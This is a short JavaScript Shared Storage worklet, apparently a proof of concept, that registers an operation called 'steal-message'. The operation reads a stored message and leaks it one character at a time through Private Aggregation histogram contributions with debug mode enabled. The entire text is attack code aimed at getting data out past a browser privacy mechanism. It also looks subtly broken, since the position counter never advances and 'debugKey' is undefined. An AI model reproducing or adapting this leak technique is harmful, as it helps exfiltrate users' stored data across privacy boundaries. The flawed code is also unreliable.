class StealMessageOperation {
    async run(data) {
        try {
            const message = await sharedStorage.get('message');
            let pos = 0;
            privateAggregation.enableDebugMode({ debugKey });
            for(let i = 0; i < message.length; i++) {
                var value = message.charCodeAt(i);
                privateAggregation.contributeToHistogram({ pos, value });
            }
            return 0;
        } catch (e) {
            throw new Error(e);
        }
    }
}

register('steal-message', StealMessageOperation);
